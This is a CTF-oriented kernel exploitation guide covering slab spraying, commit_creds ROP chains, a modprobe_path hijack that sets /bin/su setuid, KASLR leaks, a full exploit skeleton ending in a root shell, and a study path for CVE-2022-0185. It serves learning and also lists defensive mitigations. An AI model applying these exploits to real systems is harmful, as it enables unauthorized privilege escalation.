# Kernel Pwn

## Preparing the environment

A typical kernel challenge bundle:

```text
kernel/
├── bzImage          # compressed kernel image
├── vmlinux          # uncompressed kernel (with symbols, for gdb)
├── initramfs.cpio.gz / rootfs.img
├── vuln.ko          # vulnerable driver
├── run.sh           # qemu launch script
└── (.config)        # build config, optional
```

### Unpack initramfs and modify the init script

```bash
mkdir initramfs && cd initramfs
zcat ../initramfs.cpio.gz | cpio -idm
# or newc format:
# cpio -idm < ../initramfs.cpio

# modify init to get root (for CTF learning; real challenges usually setuid 1000)
sed -i 's|setuidgid 1000|setuidgid 0|g' init
# or comment out the user-switching line

# repack
find . | cpio -o --format=newc | gzip > ../initramfs.cpio.gz
cd ..
```

### Extract vmlinux (if only bzImage was given)

```bash
# use the extract-vmlinux script (in the kernel source scripts/)
/usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
```

### QEMU launch parameter template

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 256M \
    -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -cpu kvm64,+smep,+smap \
    -append "console=ttyS0 nokaslr quiet oops=panic panic=1" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    -s    # open gdb port 1234
```

Protections corresponding to key parameters:

| Parameter | Meaning | Impact on exploitation |
|------|------|---------|
| `+smep` | Kernel mode can't execute user-space code | Must use ROP; can't jump to user-space shellcode |
| `+smap` | Kernel mode can't access user-space data | The rop chain can't be in user space; it must be in kernel space (heap spray / msgsnd) |
| `+pku` | Protection Keys | Similar to SMAP |
| `nokaslr` | Disable KASLR | Function addresses fixed |
| `kaslr` | Enable KASLR | Must leak |
| `pti=on` | KPTI (Meltdown fix) | Returning to user space requires swapgs_restore_regs_and_return_to_usermode |

### Debugging

```bash
# terminal 1
./run.sh   # with -s

# terminal 2
gdb vmlinux
(gdb) target remote :1234
(gdb) b vulnerable_ioctl
(gdb) c
```

For GEF, the fork maintained by bata24 is recommended; it has dedicated pretty-printers for kernel structures.

## Vulnerability type triage

| Vulnerability | Typical source | Exploitation baseline |
|------|---------|---------|
| Kernel stack overflow | copy_from_user length controllable | Stack canary + KASLR → ROP |
| Kernel heap overflow | kmalloc slab out-of-bounds write | slab spray + overwrite adjacent object |
| UAF | refcount error / double free | Reallocate the same slab → control the freed object |
| Integer overflow | size calculation overflows → small allocation, large copy | Effectively an overflow, same as above |
| TOCTOU | User-space pointer dereferenced twice | userfaultfd / FUSE to stall |
| race | Two threads calling ioctl simultaneously | Hit the timing window |
| Arbitrary read/write | Already the ultimate primitive | Directly modify cred / modprobe_path |

## slab spray (core of heap pwn)

Spray kernel objects of a controllable size into the vulnerable slab to overwrite the target object.

| slab size | Spray object | Advantage |
|-----------|---------|------|
| kmalloc-64 / 96 | `seq_operations` | Has function pointers; overwriting controls IP |
| kmalloc-1024 | `tty_struct` | Has an ops pointer, elegant structure |
| kmalloc-4096 | `pipe_buffer` | The modern mainstay, still effective in 6.x |
| Any size | `msg_msg` | Size controllable (8 - 4096+), sysv msgsnd controls the data |
| kmalloc-128 | `user_key_payload` | The keyctl family of interfaces |

### msg_msg spray example

```c
// triggered from user space
int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

struct {
    long mtype;
    char mtext[0x80 - 0x30];  // plus the msg_msg header 0x30 = kmalloc-128
} msg = { .mtype = 0x1337 };
memset(msg.mtext, 'A', sizeof(msg.mtext));

msgsnd(msqid, &msg, sizeof(msg.mtext), 0);   // spray into kmalloc-128
// ... trigger the vulnerability to overwrite
msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // read back to see if it was modified → leak
```

## Privilege escalation paths

### 1. commit_creds(prepare_kernel_cred(0)) ROP

Classic and universal. Prerequisite: the ability to control RIP (stack overflow / vtable hijack).

```c
// user-space ROP chain
uint64_t rop[] = {
    pop_rdi,                          // pop rdi; ret
    0,                                // arg: 0
    prepare_kernel_cred,              // returns root cred in rax
    pop_rdi,                          // pop rdi; ret
    /* placeholder, overwritten by the mov below */ 0,
    /* mov rdi, rax; ... ; ret */ 0,  // move rax→rdi (some need a dedicated gadget)
    commit_creds,                     // set the current process cred = root
    swapgs_restore_regs_and_return_to_usermode + 22,  // skip the push sequence
    0, 0,                             // rax, rdi placeholders
    user_rip,                         // user-space return function (cs/ss saved)
    user_cs, user_rflags, user_rsp, user_ss,
};
```

**Key gadgets** (find them with ROPgadget in vmlinux):

```bash
ROPgadget --binary vmlinux --only "pop|ret" | grep 'pop rdi'
ROPgadget --binary vmlinux --only "mov|ret" | grep 'mov rdi, rax'
```

Before returning to user space you must save cs/ss/rflags/rsp:

```c
void save_state() {
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp));
}
void shell() { system("/bin/sh"); }
```

### 2. modprobe_path → /tmp/x (the easiest)

```text
Principle:
  - The kernel global variable modprobe_path defaults to "/sbin/modprobe"
  - When execve'ing a file with an unrecognized magic, the kernel runs modprobe_path as root
  - Change it to "/tmp/x", write /tmp/x (chmod +x), and trigger the unknown-magic execution
  
Applicable: you have an arbitrary write primitive but can't necessarily ROP
```

```c
// 1. prepare the payload
system("echo -e '#!/bin/sh\nchmod +s /bin/su' > /tmp/x");
system("chmod +x /tmp/x");

// 2. prepare the trigger file
system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger");
system("chmod +x /tmp/trigger");

// 3. vulnerable write: change modprobe_path to "/tmp/x\x00"
arbitrary_write(modprobe_path_addr, "/tmp/x\x00");

// 4. trigger
system("/tmp/trigger");
// the kernel runs /tmp/x as root, which did chmod +s /bin/su

// 5. use setuid
system("/bin/su");
```

**Source of the modprobe_path address**: a symbol in vmlinux, or /proc/kallsyms (if kptr_restrict=0).

### 3. core_pattern hijack

```text
Similar idea: /proc/sys/kernel/core_pattern controls the coredump handler
Change it to "|/tmp/x %P" so it's invoked when a process crashes
Drawback: requires triggering a coredump, more cumbersome than modprobe_path
```

### 4. Kernel ROP to disable SMEP/SMAP

If you specifically want to jump back to user-space shellcode (for learning), you can ROP to clear the cr4 bits:

```c
// CR4: SMEP = bit 20, SMAP = bit 21
// after clearing SMEP+SMAP, jumping to user-space shellcode will run
uint64_t rop[] = {
    pop_rdi,
    0x6f0,                  // desired CR4 value (SMEP/SMAP bits removed)
    mov_cr4_rdi,            // something like "mov cr4, rdi; pop rbp; ret"
    0,
    user_shellcode_addr,    // jump there (this step fails if SMEP isn't disabled yet)
};
```

In practice, **real exploitation basically doesn't take this route** — a direct commit_creds ROP is shorter and more reliable.

## KASLR leak channels

| Source | Limitation | Note |
|------|------|------|
| /proc/kallsyms | Real addresses only when `kptr_restrict=0` | Often open in CTF |
| /sys/module/.../sections/.text | Same as above | Module base address |
| dmesg | Readable only when `dmesg_restrict=0` | oops messages leak addresses |
| Uninitialized kernel stack read | The vulnerability itself must allow arbitrary read | Residual addresses |
| msg_msg + vulnerability leak | OOB read after spraying | Universal |
| Side channel (Meltdown/Spectre) | KPTI fixed Meltdown | Not universal |
| SIDT/SGDT user-space instructions | Old kernels may leak | Basically closed in modern kernels |

```c
// classic: read from /proc/kallsyms
FILE *f = fopen("/proc/kallsyms", "r");
char line[256];
unsigned long commit_creds = 0;
while (fgets(line, sizeof(line), f)) {
    if (strstr(line, " commit_creds")) {
        commit_creds = strtoul(line, NULL, 16);
        break;
    }
}
unsigned long kbase = commit_creds - 0xXXXXX;  // see vmlinux for the offset
```

## Complete exploit template (user space + ioctl trigger + ROP privilege escalation + shell)

```c
// exploit.c — generic kernel pwn skeleton
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

static unsigned long user_cs, user_ss, user_rflags, user_rsp;

static void save_state(void) {
    __asm__ volatile(
        "movq %%cs,   %0\n"
        "movq %%ss,   %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp,  %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :: "memory");
}

static void win(void) {
    if (getuid() == 0) {
        puts("[+] root!");
        system("/bin/sh");
    } else {
        puts("[-] not root");
    }
    exit(0);
}

// === KASLR base (leak first, or hardcode when nokaslr) ===
#define KBASE_DEFAULT  0xffffffff81000000UL
#define OFF_COMMIT_CREDS         0x0xxxxx
#define OFF_PREPARE_KERNEL_CRED  0x0xxxxx
#define OFF_POP_RDI              0x0xxxxx
#define OFF_MOV_RDI_RAX          0x0xxxxx
#define OFF_SWAPGS_RESTORE       0x0xxxxx

int main(void) {
    save_state();

    // 1. leak KASLR base (here we assume /proc/kallsyms is readable, or write your own leak primitive)
    unsigned long kbase = leak_kbase();

    unsigned long prepare_kernel_cred = kbase + OFF_PREPARE_KERNEL_CRED;
    unsigned long commit_creds        = kbase + OFF_COMMIT_CREDS;
    unsigned long pop_rdi             = kbase + OFF_POP_RDI;
    unsigned long mov_rdi_rax         = kbase + OFF_MOV_RDI_RAX;
    unsigned long swapgs_restore      = kbase + OFF_SWAPGS_RESTORE + 22;

    // 2. build the ROP (on the user stack or on a sprayed fake stack)
    unsigned long *rop = mmap((void*)0x100000, 0x1000,
                              PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
    int i = 0;
    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = mov_rdi_rax;
    rop[i++] = commit_creds;
    rop[i++] = swapgs_restore;
    rop[i++] = 0;  // rax
    rop[i++] = 0;  // rdi
    rop[i++] = (unsigned long)win;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = (unsigned long)(rop + 100);  // temporary user rsp; can point high in the mmap
    rop[i++] = user_ss;

    // 3. trigger the vulnerability so the kernel RIP jumps to rop[0]
    int fd = open("/dev/vuln", O_RDWR);
    trigger(fd, rop);   // challenge-specific: ioctl / write / read

    return 0;
}
```

## Learning reference: CVE-2022-0185

```text
Vulnerability: in fs/fs_context.c, legacy_parse_param's length calculation has a signed/unsigned confusion
      → kmalloc heap buffer overflow, arbitrary size, arbitrary data

Why it's a good learning sample:
1. Doesn't require root to trigger (unprivileged user namespace)
2. The overflow size is fully controllable
3. There's a complete public writeup + PoC
4. It combines: user_ns exploitation, msg_msg spraying, UAF re-occupation, cross-cache exploitation

Learning path:
1. Build a kernel with CONFIG_USER_NS=y
2. Run Crusaders of Rust's original PoC: https://www.openwall.com/lists/oss-security/2022/01/18/7
3. Read the official writeup on willsroot.io (the version featured by PortSwigger)
4. Rewrite it manually: change the msg_msg spray into a pipe_buffer spray (practice different slab paths)
5. Add a KASLR leak (the original uses /proc/kallsyms; after the challenge version disables it, switch to an OOB read)
```

The main technical points map to sections of this document:

- Vulnerability type → "Kernel heap overflow"
- Spray object → "msg_msg spray"
- Privilege escalation method → "commit_creds ROP" or "modprobe_path"
- KASLR leak → "/proc/kallsyms" or "msg_msg + vulnerability leak"

## Notes

- **CONFIG_RANDOM_KSTACK_OFFSET / RANDOMIZE_KSTACK_OFFSET_DEFAULT** randomize the kernel stack base by 0-1023 on every syscall, affecting all exploits that rely on a fixed stack offset
- **CONFIG_SLAB_FREELIST_RANDOM / HARDENED** randomize object allocation within a slab, lowering the spray success rate; spray more
- **CONFIG_STATIC_USERMODEHELPER** makes modprobe_path a read-only `static_usermodehelper_path`, defeating the modprobe attack
- **KPTI** separates user/kernel page tables; returning to user space must go through the `swapgs_restore_regs_and_return_to_usermode` trampoline, not a direct swapgs+iretq
- **FG-KASLR** (function-granular KASLR) randomizes at the function level; you need to leak multiple symbols to infer each function's offset
- **CET / IBT** (Intel Control-flow Enforcement) requires indirect jumps to land on ENDBR instructions, invalidating some gadgets
- **Don't use printk output for testing in the kernel** — serial IO changes timing and breaks races; debug with a magic register value (rcx=0xdeadbeef) + a gdb watch
